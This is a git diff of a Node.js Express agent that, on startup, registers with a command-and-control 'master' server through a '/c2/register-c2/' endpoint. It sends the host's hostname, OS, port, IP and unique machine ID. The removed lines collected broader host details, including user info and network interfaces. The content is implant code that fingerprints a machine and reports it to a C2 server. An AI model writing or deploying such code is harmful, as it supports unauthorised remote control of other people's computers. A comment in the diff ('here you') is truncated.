@@ -4,47 +4,28 @@ const {machineId, machineIdSync} = require('node-machine-id');
 const app = express()
 const os = require('os');
 const { doesNotMatch } = require('assert');
+const publicIp = require('public-ip');
 const port = 39943
-const master = "http://127.0.0.1:3333" 
+const master = "http://127.0.0.1:3333"  // here you 
 
-let servStatus = {
+
+let registerData = {
   "hostname": os.hostname(),
-  "uptime":os.uptime(),
-  "totalmem":os.totalmem(),
-  "freemem":os.freemem(),
-  "netwroks":os.networkInterfaces(),
-  "cpus":os.cpus(),
-  "platfrom":os.platform(),
-  "release":os.release(),
-  "user":os.userInfo(),
-  "arch":os.arch(),
-  "type":os.type(),
+  "os":os.platform(),
+  "port":port,
+  "ip" : "127.0.0.1",
   "uid":machineIdSync({original: true})
 
 }
 
-console.log(servStatus)
-axios.put(master+'/c2/register-c2/', servStatus).catch(function (error) {
+axios.put(master+'/c2/register-c2/', registerData).catch(function (error) {
   // console.log(error);
 
 })
 
+
+
 app.use(express.json());
-
-
-
-app.post('/test', (req, res) => {
-
-  axios.put(master+'/c2/register-c2/', {
-    os: 'sss',
-    test: 'aaa'
-  }).catch(function (error) {
-    console.log(error);
-  }).finally((data)=>{done();})
-
-    res.status(200);
-
-})
 
 app.post('/', (req, res) => {
 
